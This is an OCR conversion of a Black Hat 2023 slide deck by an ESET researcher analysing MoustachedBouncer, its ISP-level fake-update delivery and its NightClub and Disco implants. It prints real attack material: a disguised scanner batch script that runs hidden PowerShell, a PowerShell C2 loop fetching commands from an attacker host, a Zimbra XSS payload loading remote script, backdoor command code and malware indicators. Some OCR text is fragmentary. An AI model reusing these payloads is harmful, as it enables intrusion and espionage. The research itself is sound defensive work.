---
title: "MoustachedBouncer: AitM-Powered Surveillance via Belarus ISPs"
speakers: ["Matthieu Faou"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/MoustachedBouncer AitM-Powered Surveillance via Belarus ISPs.pdf"
pages: 93
sha256: "6e28054945965f1d684dfaa178b1a55e1b2c438727c29ad14ca3c5d21e1d40ff"
text_chars: 28434
ocr_pages: 40
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
content_note: "The filename carries no speaker, and 'MoustachedBouncer' is the threat actor rather than a person. Speaker taken from the deck's own title slide (Matthieu Faou, ESET)."
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:16:00Z"
---
# MoustachedBouncer: AitM-Powered Surveillance via Belarus ISPs

**Speakers:** Matthieu Faou  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/MoustachedBouncer AitM-Powered Surveillance via Belarus ISPs.pdf` (93 pages)


## Slide 1

Black Hat USA – 2023-08-10 **MoustachedBouncer** AitM-powered surveillance via Belarus ISPs

**Matthieu Faou** Senior Malware Researcher

## Slide 2

#### **Matthieu Faou**

- **Senior Malware Researcher**

- **Investigating targeted attacks since 2016**

- • **RE / Threat hunting / CTI**

matthieu.faou@eset.com

## Slide 3

5: Defense

1: MoustachedBouncer

3: NightClub

2: AitM

4: Winter Vivern

## **1: MoustachedBouncer**

## Slide 4

## Slide 5

## Slide 6

## Slide 7

## Slide 8

##### **MoustachedBouncer in short**

###### **Initial Access**

**Command and Control** SMTP/IMAP, DNS and SMB

Languages
Control
AitM C++, Go and .NET SMTP/IMAP, DNS and SMB
Turla

AitM

## Slide 9

##### **Attribution**

**Russian speakers**

**Belarus Surveillance of foreign diplomats in Belarus**

Assessment: aligned with the interests of Belarus

## Slide 10

1: MoustachedBouncer

4: Winter Vivern

2: AitM

###### 3: NightClub

5: Defense

## **2: Adversary-in-the-middle attacks**

## Slide 11


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Adversary-in-the-Middle
Sub-techniques (3) v
Adversaries may attempt to position themselves between two or more networked devices
using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as
Network Sniffing or Transmitted Data Manipulation. By abusing features of common
networking protocols that can determine the flow of network traffic (e.g. ARP DNS, LLMNR,
etc.), adversaries may force a device to communicate through an adversary controlled
system so they can collect information or perform additional actions.!"!
For example, adversaries may manipulate victim DNS settings to enable other malicious
activities such as preventing/redirecting users from accessing legitimate sites and/or
pushing additional malware. /2![5II4] adversaries may also manipulate DNS and leverage their
position in order to intercept user credentials and session cookies." Downgrade Attacks can
also be used to establish an AiTM position, such as by negotiating a less secure, deprecated,
or weaker version of communication protocol (SSL/TLS) or encryption algorithm. {ll/IIs)
Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic,
such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM
to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses
ID: T1557
Sub-techniques: 11557.001,
T1557.002, T1557.003
® Tactics: Credential Access,
Collection
© Platforms: Linux, Network,
Windows, macOS
Contributors: Daniil Yugoslavskiy,
@yugoslavskiy, Atomic Threat
Coverage project; Mayuresh Dani,
Qualys; NEC
Version: 2.2
Created: 11 February 2020
Last Modified: 30 March 2023
Version Permalink
```

## Slide 12

https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Diplomats in Eastern Europe
bitten by a Turla mosquito
ESET, Spol. sro.
January 2018
www.welivesecurity.com/wp-content/uploads/2018/01/ESET Turla Mosquito.pdf
```

## Slide 13


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
3. ABUSING ADOBE FLASH AND FLASH-RELATED
DOMAINS
It is not a new tactic for Turla to rely on fake Flash installers to try to trick the user to install one
of their backdoors. For instance, Kaspersky Lab documented this behavior in 2014 [4]. However,
this is the first time, to our knowledge, that the malicious program is downloaded over HTTP
from legitimate Adobe URLs and IP addresses. Thereby, even the most experienced users could
be deceived.
3.1 Apparent distribution through adobe.com
Since the beginning of August 2016, we have identified a few attempts to download a Turla installer
from admdownload.adobe.com URLs.
At first glance, we imagined it was the typical trick that consists of setting the host field
of the HTTP request while the TCP socket is established to the real IP of the C&C server. However,
after deeper analysis, we realized that the IP address legitimately belongs to Akamai, a large
CDN provider that Adobe uses to distribute its legitimate Flash installer.
Even if the executable is downloaded from a legitimate URL (e.g.: http: //admdownload. adobe. com/
bin/live/flashplayer27_xa_install.exe), the referer field appears to have been tampered
with. We have seen this referer field set to http: //get.adobe.com/flashplayer/download/
?installer=Flash_Player, which is not a URL pattern used by Adobe and hence returns
a 404 Status code if requested.
It is important to note that all the download attempts we identified in our telemetry were made
through HTTP, not HTTPS. This allows a wide range of attacks in the path from the user's machine
to Akamai's servers.
The next section is a review of various possible scenarios that could explain this. Exactly what happened
is still an open question and we would appreciate any feedback if you have more information.
```

## Slide 14


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Diplomats in Eastern Europe .
bitten by a Turla mosquito .
4)
1) BGP
Local man-in- ‘eS hijacking
the-middle attack
2} ISP modifies
traffic 5]
Compromised Adobe site somehow
I
I
|
I
- — interception
Figurel Possible interception points on the path between the potential victim's
machine and the Adobe servers
We quickly discarded the hypothesis of a rogue DNS server, since the IP address corresponds
to the servers used by Adobe to distribute Flash. After discussions with Adobe and from their
investigations, scenario @ seems unlikely as the attackers did not compromise the Adobe
Flash Player download website. Thus, these are the hypotheses that remain: @ a Man-in-the-
Middle (MitM) attack from an already-compromised machine in the local network, @ a compromised
gateway or proxy of the organization. @ a MitM attack at the Internet Service Provider (ISP) level
```

## Slide 15

## **How MoustachedBouncer uses AitM?**

## Slide 16

\```
msftconnecttest.com
\```

\```
updates.microsoft[.]com
\```


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Targeted
embassy
Captive portal
check
msftconnecttest.com
DNS request
Welcome!
Username:
Password:
Access Code:
DPI device
at the ISP
Please enter your credentials to connect.
Connecting to this computer network constitutes
agreement to the terms and conditions outlined
below. If you do not agree to the terms and
conditions, you must immediately disconnect
from this network. The owner and operator of
this computer network provides no warrantees,
neither express nor implied, of any right to
privacy or other such priveleges through the use
of this computer network by the user. If a court
rules any part of this agreement unlawful, this
shall not constitute a nullification of the
remainder of the agreement.
Terms and Conditions
1. The owner and operator ("Owner") of this
computer network ("the Service") reserves the
right to discontinue the Service at any time.
~) Lagree to the Terms and Conditions
Connect!
```

## Slide 17


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| Microsoft Office Windows Surface Xbox Deals Support More
Windows Support What'snew Get Windows 11 Activate Installupdates Tips |Community
Learn how to keep in touch and stay productive with Microsoft Teams and Office 365, even when you're working remotely >
Windows 10, ve ail this article
1909 and Wind it
Server, version scribe RSS
update history ds
Windows 10, ve...
1903 and Windows
Server, version 1903
update history Apply: Windows 10, version 1903, all editionsWindows Server version 1903 Windows 10, version
1909, all editions
Windows 10, version
1809, Windows
Server, version 1809,
and Windows Server
2019 update history
Windows 10, version
1803 update history Version: 1903-08 Build 18362.720 and 1909-05 Build 18363.720
Release Date: February 25, 2022;
Windows 10, version
1709 update history
Windows 10, version
1703 update histo What's new for Windows 10, version 1909 and Windows 10, version 1903 release notes
```

## Slide 18


> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
function () {
var new ();
. function() {
if (this. ){
var new ([this. 1, { : })3
if (window.navigator.msSaveOrOpenBlob) {
window.navigator.msSaveOrOpenBlob(blob, “MicrosoftUpdate845255.zip*");
} else {
var download_url = window.URL.createObjectURL(blob);
var a = document.createElement("a");
a.href = download_url;
a.download = ‘MicrosoftUpdate845255.zip";
a.click();
} else {
}3
```

## Slide 19

msftconnecttest.com

\```
updates.microsoft[.]com
\```

\```
MicrosoftUpdate845255.exe
\```


> Recovered by OCR — confidence 83/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ft Captive portal
check BW
Targeted DPI device
embassy ER msftconnecttest.com at the ISP .
DNS request 9)
Fake update
MicrosoftUpdate845255.exe
CEEED |
Plugins
```

## Slide 20

\```
MicrosoftUpdate845255.exe
\\35.214.56[.]2\OfficeBroker\OfficeBroker.exe
\```

## Slide 21

\```
MicrosoftUpdate845255.exe
\\35.214.56[.]2\OfficeBroker\OfficeBroker.exe
\```


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Fake update Agh
MicrosoftUpdate845255.exe
35.214.56.2
CJ Summary #4 Explore © History {) WHOIS
Basic Information
Network GOOGLE-2 (US)
Routing 35.214.0.0/17 via AS19527
Protocols no publicly accessible services
```

## Slide 22

msftconnecttest.com

\```
updates.microsoft[.]com
\```

\```
MicrosoftUpdate845255.exe
\```


> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ft Captive portal
check BW
Targeted DPI device
embassy a | msftconnecttest.com at the ISP =
DNS
))
updates.microsoft[.]com
Fake update
MicrosoftUpdate845255.exe
Plugins
---------------------------->
```

## Slide 23

**AitM: compromised router or ISP?**

## Slide 24

**Residential IP addresses**

## Slide 25

## **Deep Packet Inspection in Belarus**

## Slide 26


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
dustries Technology Politics Wealth Pursuits Opinion Businessweek Equality Green CityLab
U.S. Company Faces Backlash After Belarus
Uses Its Tech to Block Internet
a U.S. firm promotes ability to ‘blacklist’ 150 million websites
= Senator calls on Treasury Department to investigate company
LIVE ON BLOOMBERG
Watch Live TV >
Listen to Live Radio >
```

## Slide 27


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@®ee munk school a UNIVERSITY OF Q
Research > Free Expression Online
BAD TRAFFIC
Sandvine’s PacketLogic Devices Used to Deploy
Government Spyware in Turkey and Redirect
Egyptian Users to Affiliate Ads?
By Bill Marczak, Jakub Dalek, Sarah McKune, Adam Senft, John Scott-Railton, and Ron Deibert
March 9, 2018
Download this report
```

## Slide 28


> Recovered by OCR — confidence 94/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BELARUS
SUBMISSION TO THE UNITED NATIONS HUMAN RIGHTS COMMITTEE
124TH SESSION, 8 OCTOBER TO 2 NOVEMBER 2018
AMNESTY .4,
```

## Slide 29

SORM


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Article 17
The legal framework governing secret surveillance allows the authorities to undertake wide-ranging surveillance
with little or no justification. The System of Operative Investigative Measures (SORM), a system of lawful
Interception of all electronic communications, enables the authorities direct access to telephone and internet
communications and associated data. The possible surveillance restricted human rights defenders, other civil
society and political activists as well as journalists in exercising their human rights.*
The SORM system allows the authorities direct, remote-control access to all user communications and
associated data without notifying the providers. Under Belarusian law, all telecommunications providers in the
country must make their hardware compatible with the SORM system. The system facilitates real-time
SORM
```

## Slide 30

**Assessment: ISP level**

## Slide 31

\```
msftconnecttest.com
\```

\```
updates.microsoft[.]com
MicrosoftUpdate845255.exe
\```


> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ft Captive portal
check BW
Targeted DPI device
embassy a | msftconnecttest.com at the ISP =
DNS
))
updates.microsoft[.]com
---------------------------->
Fake update
MicrosoftUpdate845255.exe
```

## Slide 32

##### **Disco**

# **Go 2020 AitM**

## Slide 33

Disco


> Recovered by OCR — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
4 github_com_mozey_schtasks... .text
4 github_com_mozey_schtasks... .text
4 main_DNSQuery_encode text
4 main_DNSQuestion_encode text
github_com_mozey_schtasks_RunEveryMinutes((__int64)"\\\\35.214.56.2\\0fficeBroker\\OfficeBroker.exe", 43LL, v®@, 1LL);
if ( "\\\\35.214.56.2\\0fficeBroker\\OfficeBroker.exe" )
log Fatal(v4);
github_com_mozey_schtasks_RunEveryMinutesHighest (
43LL,
v2,
1LL);
main_RunQuery(25LL, 43LL, v3, (__int64)"windows.system.update.com");
Disco
```

## Slide 34

**Execute**

Spying plugins

##### **SMB shares**

**Exfiltrate**

Collected data

**Linux machine**

Kali Linux

## Slide 35

##### **Plugins - SMB shares**

\```
\\209.19.37[.]184\driverpack\aact.exe
\\59.6.8[.]25\outlooksync\outlooksync.exe
\\52.3.8[.]25\oracle\oracleTelemetry.exe
\\globaltelemetry[.]org\info\driverconfigurator.exe
\\facebooklogger[.]org\logs\logger.exe
\\hotkeysstatus[.]com\statuses\checkme.exe
\```

## Slide 36

##### **Plugins - SMB shares**

\```
\\209.19.37[.]184\driverpack\aact.exe
\\59.6.8[.]25\outlooksync\outlooksync.exe
\\52.3.8[.]25\oracle\oracleTelemetry.exe
\\globaltelemetry[.]org\info\driverconfigurator.exe
\\facebooklogger[.]org\logs\logger.exe
\\hotkeysstatus[.]com\statuses\checkme.exe
\```

`whois hotkeysstatus.com No match for domain "HOTKEYSSTATUS.COM".` 117.61.84[.]5

## Slide 37

##### **Plug-ins**

**Take PowerShell screenshots scripts**

**Recent file stealer**

**LPE Reverse Proxy CVE-2021-1732 (revsocks)**

## Slide 38

1: MoustachedBouncer

2: AitM

3: NightClub

4: Winter Vivern

5: Defense

## **3: NightClub**


> Recovered by OCR — confidence 66/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
. PAVBaseFilesProvider@filemon@swamp@@ £C@> . PAVSwampFileSender@swamp@@ £C@> . PAVIFileSender@
tr@def@@ £C@> . PAVGammaStreamEncryptor@depth@jasons@@ £C@> . PAVAbsolutizedBase@depth@jasons
a . PAVIStreamEncryptor@depth@jasons@@ £C@r . ?AVexception@@ £CO> . PAVException@except
ion@def@@ £C@» . PAVLcgEncryptionBase@depth@jasons@@ £C@> . PAVProHypoxemia@depth@jasons@@
£C@> . PAVIEncryptor@depth@jasons@@ £C@> . PAVSentFilesStorage@filemon@swamp@@ £C@r 2A
IFilesListStorage@filemon@swamp@@ £C@> . PAVFilesEnumerator@file@def@@ £C@> . PAAVIFileSystemP
```

## Slide 39

##### **NightClub**

# **C++ 2014 VPN**

## Slide 40

Oldest known sample of NightClub


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
; 2 5 @ 35 security vendors and no sandboxes flagged this file as malicious Cc
C:\Users\Support\Desktop\EsetUpdate-0117583943.eee
peexe
Community Score
DETECTION DETAILS RELATIONS BEHAVIOR CONTENT TELEMETRY COMMUNITY
Submissions @
Date Name Source Country
2014-11-19 17:20:23 UTC C:\Users\Support\Desktop\EsetUpdate-0117583943.eee {i} 725be15c - api UA
Oldest known sample of NightClub
```

## Slide 41

Configuration


> Recovered by OCR — confidence 82/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
unk_10@1A8Ce db 7Ch ; | DATA XREF: F_decrypt_string_by_ID+DTr
Nee
3; .doc
3 glen.morriss
glen.morriss75@seznam.cz
SunyaF@seznam.cz
smtp.seznam.cz
we
we
we
db 6
```

## Slide 42

###### **File stealer**

.doc, .docx, .xls and .pdf

##### **Capabilities**

###### **C&C by emails**

SMTP CSmtp library

## Slide 43


> Recovered by OCR — confidence 91/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
220 smtp.mail.com Python SMTP 1.4.2
EHLO computer
250-smtp.mail.com
250-SIZE 33554432
250-8BITMIME
250-SMTPUTF8
250-STARTTLS
250-AUTH LOGIN PLAIN
250 HELP
AUTH LOGIN
334 VXNIciBOYW 1IAA==
334 UGFzc3dvemQA
235 2.7.0 Authentication successful
250 OK
RCPT TO:<SunyaF@seznam.cz>
```

## Slide 44


> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
250-STARTTLS
250-AUTH LOGIN PLAIN
250 HELP
AUTH LOGIN
334 UGFzc3dvemQA
235 2.7.0 Authentication successful
MAIL FROM:<glen.morriss75@seznam.cz>
250 OK
RCPT TO:<SunyaF@seznam.cz>
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
Date: 10 Mar 2022 20:8:37
From: glen.morriss75 <glen.morriss75@seznam.cz>
Y¥-Mailer: The Rat! (v3 02) Profeccinnal
```

## Slide 45


> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
Date: 10 Mar 2022 20:8:37
From: glen.morriss/5 <glen.morriss75@seznam.cz>
X-Mailer: The Bat! (v3.02) Professional
Reply-To: glen.morriss75@seznam.cz
X-Priority: 3 (Normal)
To: <SunyaF@seznam.cz>
Subject: no
MIME-Version: 1.0
-- MESSAGE ID 54yq6f6éh6y456345
Content-type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit
file
```

## Slide 46


> Recovered by OCR — confidence 93/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
X-Priority: 3 (Normal)
To: <SunyaF@seznam.cz>
Subject: no
MIME-Version: 1.0
Content-type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit
file
Content-Type: application/x-msdownload; name="TEST FILE.bin"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="TEST FILE.bin"
```

## Slide 47

**2020-2022 variant**

## Slide 48

##### **2020-2022 variant**

**Orchestrator**

**Orchestrator Module agent** svhvost.exe schvost.exe

**Shared code**

with past versions

## Slide 49

\```
%APPDATA%\Microsoft
\def\Gfr45.cfg
\```

##### **Configuration**

**RSA**

**Hardcoded key**

## Slide 50

\```
{
\```

\```
"main":{
\```

\```
"agent_name":"<filename of the module agent>",
\```

\```
"server_name":"<filename of the orchestrator>",
\```

\```
"auto_del": {
\```

\```
"enabled":<true or false>,
\```

\```
"days":<integer>
\```

\```
}
\```

\```
},
"storage":{
\```

\```
"path":"<path>",
\```

\```
"max_size":<integer>,
\```

\```
"stop_at_limit":<true or false>
\```

\```
}
\```

## Slide 51

\```
},
\```

\```
"transport":{
\```

\```
"client_mail":"<email address>",
\```

\```
"pass":"<password of the email address>",
"control_mail":"<email address>",
\```

\```
"smtp":"<domain>",
\```

\```
"pop3":"<domain>",
\```

\```
"server_port":<integer>,
\```

\```
"use_ssl":<true or false>,
\```

\```
"max_file_size":<integer>,
\```

\```
"max_daily_traffic":<integer>
\```

\```
},
\```

\```
"modules":[
\```

## Slide 52

\```
"max_file_size":<integer>,
"max_daily_traffic":<integer>
\```

\```
},
"modules":[
\```

\```
{
\```

\```
"name":"<filename of the module>",
\```

\```
"enabled":<true or false>,
\```

\```
"max_size":<integer>,
"file":"<filename of the output file>"
\```

\```
//[Other fields depending on the module]
\```

\```
}
\```

\```
]
\```

\```
}
\```

## Slide 53

##### **NightClub plugins**

INI

**Masquerade**

**Export**

**Start** or **Starts**

**JSON**

## Slide 54

###### **Audio recorder**

##### **Plugins**

**Screenshotter**

**Keylogger**

**DNS-tunneling backdoor**

## Slide 55

## **DNS-tunneling backdoor**

## Slide 56

DNS tunneling backdoor


> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
inet_pton(2, cc_server_address, &addr->pName) ;
A = DnsQuery_A(pszName, DNS_TYPE_TEXT, DNS _QUERY_BYPASS CACHE, addr, ppQueryResults, @);
ppStringArray = _ppQueryResults->Data.TXT.pStringArray;
_Dst[4] = @;
_Dst[5] = 15;
LOBYTE(v23) = 2;
if ( _ppQueryResults->Data.TXT.dwStringCount )
{
do
{
String concat( Dst, *ppStringArray);
_Dst = Dst;
++ppStringArray;
}
while ( i < _ppQueryResults->Data.TXT.dwStringCount );
_ppQueryResults = ppQueryResults;
}
DNS tunneling backdoor
```

## Slide 57

##### **Requests**

\```
xZW1wdHkx.11.1.1.cid
\```

## Slide 58

##### **Requests**

\```
xZW1wdHkx.11.1.1.cid
\```

## Slide 59

##### **Requests**

\```
xZW1wdHkx.11.1.1.cid
\```

### `empty`

## Slide 60

##### **Replies**

\```
xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc
\```

## Slide 61

##### **Replies**

\```
xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx.27.2.1.calc
\```

###### `c:\windows\system32\calc.exe`

## Slide 62

##### **Replies**

###### `x` **`Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ`** `x.` **`27`** `.2.1.calc`

\```
Command ID
\```

###### `c:\windows\system32\calc.exe`

## Slide 63

##### **Replies**

###### `x` **`Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ`** `x.` **`27`** `.2.1.` **`calc`**

\```
c:\windows\system32\calc.exe
\```

\```
Command ID
\```

\```
Command name
(useless)
\```

## Slide 64


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Switch ( command->cmd_id )
{
case 21:
Block = operator new(@x5Cu);
*Block = 0164;
Block[2] = @;
Block[1] = 1;
Block[2] = 1;
*Block = off_10044404;
Cmd::copy_directory(Block + 3, &savedregs, &command->argument) ;
*a1 = Block + 3;
result = al;
al[1] = Block;
break;
case 22:
Blocka = operator new(@x5Cu);
*Blocka = @164;
Blocka[2] = @;
Blocka[1] = 1;
Blocka[2] = 1;
*Blocka = off_100444@4;
Cmd::Move_file(Blocka + 3, &savedregs, &command->argument) ;
*al = Blocka + 3;
```

## Slide 65


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
case 23:
Blockb = operator new(@x44u);
*Blockb = 0164;
Blockb[2] = @;
Blockb[1] = 1;
Blockb[2] = 1;
*Blockb = of f_100440E4;
Cmd::remove_file or_dir(Blockb + 3, &command->argument) ;
*a1 = Blockb + 3;
result = al;
al[1] = Blockb;
break;
case 24:
Blockc = operator new(@x44u);
*Blockc = 0164;
Blockc[2] = @;
Blockc[1] = 1;
Blockc[2] = 1;
*Blockc = of f_100440E4;
Cmd::Search file(Blockc + 3, &command->argument) ;
```

## Slide 66


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
case 25:
Blockd = operator new(@x5Cu) ;
*Blockd = 0164;
Blockd[2] = @;
Blockd[1] = 1;
Blockd[2] = 1;
*Blockd = off_10044098;
Cmd::Write file(Blockd + 3, &command->argument) ;
*a1 = Blockd + 3;
result = al;
al[1] = Blockd;
break;
case 26:
Blocke = operator new(@x44u) ;
*Blocke = 0164;
Blocke[2] = @;
Blocke[1] = 1;
Blocke[2] = 1;
*Blocke = off_10@440E4;
Cmd::Read file(Blocke + 3, &command->argument) ;
```

## Slide 67


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
case 27:
Blockf = operator new(@x44u) ;
*Blockf = 0164;
Blockf[2] = @;
Blockf[1] = 1;
Blockf[2] = 1;
*Blockf = of f_ 10044190;
Cmd::CreateProcess(Blockf + 3, &command->argument) ;
*a1 = Blockf + 3;
result = al;
al[1] = Blockf;
break;
default:
result = al;
break;
```

## Slide 68

Bored malware researcher waiting for Gfr45.cfg

## Slide 69

**NightClub Registrar, C&C server hosting provider & network scanning**

**Unique pattern**

**Winter Vivern C&C servers**

## Slide 70

5: Defense

1: MoustachedBouncer

3: NightClub

2: AitM

4: Winter Vivern

## **4: Winter Vivern**

## Slide 71


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Winter Vivern: A Look At Re-Crafted Government
MalDocs Targeting Multiple Languages
Chad Anderson
@piffey
Executive Summary
While parsing Microsoft Excel documents using XLM 4.0 macros, the DomainTools Research team came across a
Lithuanian-language document title innocuously named “contacts”. The simple macro in this document dropped a slightly
more fomplex PowerShell script that performed C2 communications with a domain that has been active since December
2020 and appeared on no industry-standard blocklists. The most recent domain serving documents was registered in April
2021 and DomainTools Research believes other domains used as short term distribution may lead to other documents. The
macro and domain mentioned, when hunted on, revealed documents targeting lAzerbaijan, Cyprus, India, Htaly, Lithuania,
[Ukraine, and the Vatican] The DomainTools Research team colloquially refers to this as “Winter Vivern” due to the path used
in C2 communication over the last several months.
```

## Slide 72


> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Computer Emergency Response Team of Ukraine
About CERT-UA | News | Recommendations | ContactUs | Contacts | fl | w | NX | Q Search
Main News
UAC-0114 aka Winter Vivern to target Ukrainian and
Polish GOV entities (CERT-UA#5909)
Background
The Computer Emergency Response Team of Ukraine (CERT-UA) detected a web page which
mimics the website of the Ministry of Foreign Affairs of Ukraine and lures a user to download
software for "scanning infected PCs on viruses".
```

## Slide 73


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation is a Dish Best Served Cold:
Winter Vivern Uses Known Zimbra
Vulnerability to Target Webmail Portals
of NATO-Aligned Governments in
Europe
MARCH 30, 2023 | MICHAEL RAGG! AND THE PROOFPOINT THREAT RESEARCH TEAM
Key Takeaways
```

## Slide 74

**Typical compromise chain**

## Slide 75


> Recovered by OCR — confidence 94/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INS
* Files and programs access blocked
Instruction:
Download our software!
Click to here
Run program (Since the developed program is not a public product, it may be necessary to
confirm the user's actions at startup).
Get Result (The application will scan the necessary directories and show the scan result).
When malicious software is detected, the scanning program will display the location of
viruses, you need to remove them!
```

## Slide 76


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Scan viruses Signatures started.
Scaning...
3%
7%
13%
22%
29%
35%
41%
50%
57%
68%
72%
87%
90%
98%
Virus not found!
Press any key to continue .
```

## Slide 77


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@echo off
echo Scan viruses signatures started.
echo Scaning...
powershell.exe -c "Start-Process -win hidden -filepath 'powershell.exe' -argumentlist
*¢$a=whoami;"",""[System.Net.ServicePointManager ]::ServerCertificateValidationCallback = {° $true};iex
echo 3%%
timeout 3 > NUL
echo 7%%
timeout 2 > NUL
echo 13%%
timeout 4 > NUL
echo 22%%
timeout 2 > NUL
echo 29%%
timeout 1 > NUL
echo 35%%
timeout 4 > NUL
echo 41%%
timeout 3 > NUL
echo 50%%
timeout 1 > NUL
echo 57%%
timeout 3 > NUL
echo 68%%
timeout 2 > NUL
echo 72%%
timeout 3 > NUL
```

## Slide 78


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
timeout 2 > NUL
echo 13%%
timeout 4 > NUL
echo 22%%
timeout 2 > NUL
echo 29%%
timeout 1 > NUL
echo 35%%
timeout 4 > NUL
echo 41%%
timeout 3 > NUL
echo 50%%
timeout 1 > NUL
timeout 3 > NUL
echo 68%%
timeout 2 > NUL
echo 72%%
timeout 3 > NUL
echo 87%%
timeout 1 > NUL
timeout 2 > NUL
echo 98%%
timeout 1 > NUL
echo Virus not found!
pause
```

## Slide 79

tasklist
whoami
arp -a
dir


> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
function sendData($message) {
try f{
if ($message -ne $null) {
(New-Object Net.Webclient).UploadString($singleHost + “taskes/usersfolders
}
} catch {
($Error[@])
}
}
function starter {
$message = try {
$com = (New-Object Net.Webclient).DownloadString($singleHost + “taskes/usersfolders
if (Scom.Length -ge 1) f{
, — tasklist
whoami
} catch { =
sendData($message) ;
sleep 10;
starter
```

## Slide 80

**And some CVEs!**

## Slide 81

\```
https://<victim’s Zimbra
domain>/public/error.jsp?errCode=
onload=if(!document.getElementById("x67xasd765")){w
indow.x=document.createElement('script');window.x.i
d="x67xasd765";
window.x.src='https://oscp-avanguard[.]com/
5026dbbkj2KJ21fr_[redacted]_Fas2/auth.js';
document.body.appendChild(window.x);}>&accountName=
<victim’s email address>
\```

## Slide 82

**CVE-2022-27926**


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZBUG-2084 Prevent Javascript insertion into the error.jsp page on Zim... Browse files
® develop (#674)
Bp zmcommand authored and silentsakky committed on Feb 25, 2022 1 parent 19a8dbb commit ffe1431
Showing 1 changed file with 4 additions and 4 deletions. Split | Unified |
CVE-2022-27926
ft. @@ -53,7 +53,7 @@
53 53 <html>
54 54 <head>
55 55 <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
56 = <title>${errCode} - <fmt:message key="${errTitle}"/></title>
